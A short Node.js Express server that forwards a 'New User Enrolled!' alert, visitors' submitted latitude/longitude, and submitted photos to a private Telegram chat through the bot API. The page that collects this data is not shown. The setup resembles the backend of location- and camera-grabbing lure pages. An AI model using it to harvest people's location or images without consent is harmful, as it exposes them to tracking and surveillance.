require("dotenv").config();
const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();

app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.static(path.join(__dirname, "public")));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Basic message
app.get("/send", async (req, res) => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: "🎉 New User Enrolled!"
        });
        res.send("Message Sent ✅");
    } catch (err) {
        res.status(500).send("Error");
    }
});

// Location
app.post("/location", async (req, res) => {
    const { lat, lon } = req.body;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            chat_id: CHAT_ID,
            latitude: lat,
            longitude: lon
        });

        res.send("Location Sent ✅");
    } catch {
        res.status(500).send("Error");
    }
});

// Photo
app.post("/photo", async (req, res) => {
    const { image } = req.body;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            chat_id: CHAT_ID,
            photo: image
        });

        res.send("Photo Sent ✅");
    } catch {
        res.status(500).send("Error");
    }
});

app.listen(3000, () => {
    console.log("Server running at http://localhost:3000 🚀");
});
